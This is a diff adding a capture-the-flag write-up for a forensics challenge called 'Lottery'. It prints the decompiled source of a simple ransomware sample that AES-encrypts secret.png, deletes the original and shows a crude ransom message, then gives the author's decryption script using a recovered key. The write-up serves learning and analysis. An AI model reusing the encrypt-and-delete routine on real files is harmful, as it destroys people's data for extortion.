@@ -178,3 +178,81 @@ BITSCTF{I_7h1nk_th3y_4Re_k3yl0991ng_ME!}
 
 " MogamBro
 ```
+
+# Lottery
+
+**Flag:** `BITSCTF{1_r3c3ived_7he_b0mbz}`
+
+Given is an executable which I found to be a PyInstaller file. I extracted the python code using [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor).
+
+Upon extraction, we find the file we wanted— `lottery.pyc`. Using an online `.pyc` decompiler with the uncompyle6 engine, we get the following file.
+
+```py
+# uncompyle6 version 3.9.1
+# Python bytecode version base 3.8.0 (3413)
+# Decompiled from: Python 3.6.12 (default, Feb  9 2021, 09:19:15)
+# [GCC 8.3.0]
+# Embedded file name: lottery.py
+import os, tempfile
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
+
+def generate_key():
+    key = os.urandom(32)
+    fp = tempfile.TemporaryFile(mode="w+b", delete=False)
+    fp.write(key)
+    return key
+
+
+def encrypt_file(file_path, key):
+    iv = b'urfuckedmogambro'
+    with open(file_path, "rb") as file:
+        data = file.read()
+        padded_data = pad(data, AES.block_size)
+        cipher = AES.new(key, AES.MODE_CBC, iv)
+        encrypted_data = cipher.encrypt(padded_data)
+    file.close()
+    encrypted_file_path = file_path + ".enc"
+    with open(encrypted_file_path, "wb") as encrypted_file:
+        encrypted_file.write(encrypted_data)
+    os.remove(file_path)
+
+
+if __name__ == "__main__":
+    key = generate_key()
+    file_path = "secret.png"
+    encrypt_file(file_path, key)
+    print("Dear MogamBro, we are fucking your laptop with a ransomware & your secret image is now encrypted! Send $69M to recover it!")
+```
+
+As we can see, it runs an AES block cipher on the encrypted PNG file using an IV `urfuckedmogambro` and a random key, and removes the original PNG file.
+
+We also see that the key is stored in a temporary file as well. Poking around the `.ad1` filesystem we got, we find the key in `C:\Users\MogamBro\AppData\Local\Temp\tmpd1tif_2a`.
+
+So we have the key, the code, and the encrypted file. We now reverse the AES decryptor and the flag.
+
+```py
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import unpad
+
+def decrypt_file(encrypted_file_path, key):
+    iv = b'urfuckedmogambro'
+    with open(encrypted_file_path, "rb") as encrypted_file:
+        encrypted_data = encrypted_file.read()
+        cipher = AES.new(key, AES.MODE_CBC, iv)
+        decrypted_data = cipher.decrypt(encrypted_data)
+        unpadded_data = unpad(decrypted_data, AES.block_size)
+    decrypted_file_path = encrypted_file_path[:-4]  # Remove the ".enc" extension
+    with open(decrypted_file_path, "wb") as decrypted_file:
+        decrypted_file.write(unpadded_data)
+
+if __name__ == "__main__":
+    key_file_path = "tmpd1tif_2a"
+    with open(key_file_path, "rb") as key_file:
+        key = key_file.read()
+    encrypted_file_path = "secret.png.enc"
+    decrypt_file(encrypted_file_path, key)
+    print("File decrypted successfully!")
+```
+
+![secret.png](../../../Images/secret.png)
